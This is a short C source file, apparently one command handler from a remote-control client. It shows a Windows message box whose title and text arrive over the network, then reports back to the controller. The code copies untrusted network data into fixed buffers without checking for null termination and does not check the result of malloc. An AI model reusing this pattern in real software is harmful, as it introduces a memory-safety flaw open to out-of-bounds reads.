#include <windows.h>
#include "commands/cmds.h"
#include "net/file.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"

#define SERV_MESSAGEBOX_MBOX_FAILED 0xF
#define SERV_MESSAGEBOX_MBOX_MAX 200

typedef struct _serv_mbox_info
{
	uint8 type;
	char title[SERV_MESSAGEBOX_MBOX_MAX];
	char msg[SERV_MESSAGEBOX_MBOX_MAX];
}SERV_MBOX_INFO;

ulong __stdcall cmds_MESSAGEBOX_thread(void* args)
{
	SERV_MBOX_INFO* minfo = (SERV_MBOX_INFO*)args;

	MessageBox(GetForegroundWindow(), minfo->msg, minfo->title, minfo->type);

	free(minfo);

	return 0;
}

int cmds_MESSAGEBOX(uint8* msg)
{
	SERV_MBOX_INFO* minfo = malloc(sizeof(SERV_MBOX_INFO));
	memcpy(minfo, msg, sizeof(SERV_MBOX_INFO));
	
	if(!CreateThread(NULL, 0, cmds_MESSAGEBOX_thread, minfo, 0, NULL))
	{
		free(minfo);

		if(net_SendEmptyCmd(SERV_MESSAGEBOX_MBOX_FAILED) < 1)
		{
			return 0;
		}

		return 1;
	}

	if(net_SendEmptyCmd(CMDS_MESSAGE_BOX) < 1)
	{
		return 0;
	}

	return 1;
}